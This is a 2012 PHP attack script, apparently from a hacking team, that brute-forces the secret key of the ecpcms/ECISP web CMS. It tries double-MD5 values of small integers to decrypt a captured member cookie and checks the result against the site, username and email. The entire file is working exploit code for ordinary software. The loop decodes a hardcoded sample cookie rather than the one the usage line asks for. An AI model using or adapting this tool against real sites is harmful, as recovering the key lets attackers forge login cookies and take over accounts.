<?php

//error_reporting(0);
@ini_set('memory_limit','-1');
set_time_limit(0);


echo "
/*======================================================================================
====Name:ecpcms  key  get                                                           ====
========================================================================================
====Usage:php  e.php  site  name  eamil ecisp_member_info                           ====
========================================================================================
====Team:C0dePlay  Team    www.C0dePlay.com                                         ====
========================================================================================
====Author: Yaseng  ��WwW.Yaseng.Me��                                               ====
====Date: 2012-06-15 01:35:00                                                       ====
======================================================================================*/
";

 if ($argc < 5)
{
    Msg("Example: php   $argv[0]  www.yaseng.me  yaseng  yaseng@uauc.net  UZJZpmJKYZmRr4JZnmGBraGaaZJezwm6dl5huZZmXaZJklZ_DyJdkkmyYmm_JZ2ScYMqVlJjdbWlkaGeXyMaWl2eTnpiXw2Rja8WaaJuTamtkmJXJmJY",0);

}else{
	
	
 
	msg("Start calculate the  db_pscode...");
	
	for($i=99;$i<=999;$i++){
		
		$key=md5(md5($i));
		
		msg("Test $i :".$key);
		$admin_ClassURL=md5("http://".$argv[1]."/");
		$temp='am2x4Wizl7SvwqXL1MulqpKmk5OnmNeucWlpZmpncWtutW6cbmeda26aaeLHmcqalWlimmtpk2NqmJWcaGaaZmtvbslvZ8pomsVix-KbyGZjZmiVb5Wbk3CTlGpslZtjanFqnW9wn55pxZiclw';
		$real_cookie_info=eccode($temp,'DECODE',$key);
		
 
 
 	if($real_cookie_info){
			
			
			if(strpos($real_cookie_info,$argv[2])  && strpos($real_cookie_info,$argv[3]) && strpos($real_cookie_info,$admin_ClassURL)){
				
				msg("The Key  Is :".$key);
				break;
				
			}
			
			
		}
	 
		
		
		
	}
	
	
	
	
	
}

function  msg($str,$type=1){
	
	$str=($type) ? "[+]".$str : "[-]".$str;
	echo $str."\r\n";
	
}



function eccode($string, $operation = 'DECODE', $key = '@LFK24s224%@safS3s%1f%') {
	$result = '';
	if ($operation == 'ENCODE') {
		for ($i = 0; $i < strlen($string); $i++) {
			$char = substr($string, $i, 1);
			$keychar = substr($key, ($i % strlen($key)) - 1, 1);
			$char = chr(ord($char) + ord($keychar));
			$result.=$char;
		}
		$result = base64_encode($result);
		$result = str_replace(array('+', '/', '='), array('-', '_', ''), $result);
	} elseif ($operation == 'DECODE') {
		$data = str_replace(array('-', '_'), array('+', '/'), $string);
		$mod4 = strlen($data) % 4;
		if ($mod4) {
			$data .= substr('====', $mod4);
		}
		$string = base64_decode($data);



		for ($i = 0; $i < strlen($string); $i++) {
			$char = substr($string, $i, 1);
			$keychar = substr($key, ($i % strlen($key)) - 1, 1);
			$char = chr(ord($char) - ord($keychar));
			$result.=$char;
		}
	}
	return $result;
}









?>